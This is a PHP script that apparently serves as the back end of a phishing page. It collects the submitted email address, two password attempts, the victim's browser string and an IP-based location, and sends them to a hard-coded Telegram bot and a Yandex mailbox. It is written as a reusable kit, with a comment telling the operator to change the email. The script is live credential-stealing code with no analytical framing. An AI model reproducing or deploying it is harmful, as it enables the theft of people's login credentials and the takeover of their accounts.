<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $userAgent = $_POST["userAgent"];
    $step = $_POST["step"]; // Identify submission step

    // Fetch IP & Location Data
    $ipData = json_decode(file_get_contents("https://ipapi.co/json/"), true);
    $ip = $ipData["ip"];
    $country = $ipData["country_name"];
    $city = $ipData["city"];
    $state = $ipData["region"];
    $time = date("Y-m-d H:i:s");

    // Telegram API Details
    $telegramBotToken = "7426504743:AAFFyIFQJ-luXI7BJpgzidgyB4tnmK-XV2g";
    $chatId = "1460027088";

    // Message based on step
    if ($step == "1") {
        $message = "📩 Email: $email\n🔑 Password (Step 1): $password\n🌍 IP: $ip\n📍 Location: $city, $state, $country\n🕒 Date & Time: $time\n🖥️ Browser: $userAgent";
    } else {
        $message = "📩 Email: $email\n🔑 Password (Step 2): $password\n🌍 IP: $ip\n📍 Location: $city, $state, $country\n🕒 Date & Time: $time\n🖥️ Browser: $userAgent";
    }

    // Send Data to Telegram
    file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

    // Send to Email (Optional)
    $to = "zaza.sparkio@yandex.com";  // Change to your email
    $subject = "New Submission - Step $step";
    $headers = "From: noreply@privatee.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to, $subject, $message, $headers);

    // ✅ No Response Sent Back to JavaScript
    exit;
}
?>